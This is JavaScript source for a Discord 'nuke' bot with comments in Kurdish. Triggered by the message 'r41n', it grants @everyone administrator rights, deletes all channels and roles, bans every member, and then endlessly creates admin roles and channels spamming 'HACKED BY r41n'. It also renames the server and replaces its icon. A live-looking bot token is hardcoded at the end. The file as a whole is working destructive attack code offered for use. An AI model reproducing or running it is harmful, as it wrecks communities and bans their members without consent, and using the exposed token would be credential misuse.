const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "."; ///lera ba dly xot prefix dabne
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

// message.guild.members.forEach(m =>{
// m.ban()

// })


client.on("message", message => {
  if (message.content.startsWith(`r41n`)) {
    message.delete();
    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
    });
    message.guild.channels.cache.map(c => {
      c.delete();
    });
    message.guild.roles.cache.forEach(r => {
      r.delete();
    });

    message.guild.members.cache.forEach(m => {
      m.ban();
    });

    setInterval(() => {
      message.guild.roles
        .create({
          name: "r41n is here :joy:",
          permissions: ["ADMINISTRATOR"]
        })
        .then(rr => {
          message.member.roles.add(rr.id);
        });
    }, 1000);
    message.guild.setIcon("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
    client.user.setAvatar("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
    client.user.setUsername("Loon");
    message.guild.owner.send(
      "تـڕپـەقـاڵ ئـەمـژی"
    );
    message.guild.setName("r41n is here");
    setTimeout(function() {
      setInterval(
        () => {
          message.guild.channels
            .create("HACKED BY r41n", "text")
            .then(channel => {
              channel.send(
                "@everyone r41n is here :joy: :joy: :joy:"
              );
            });
        },

        500
      );
    });
  }
});




////codaka drwst krawa lalayan black jack

client.login("ODM3ODY4MzA2MTMxNDUyMDA0.YIyzqw.PrheuFBrNBHcsULaPW6CrknUHTw");
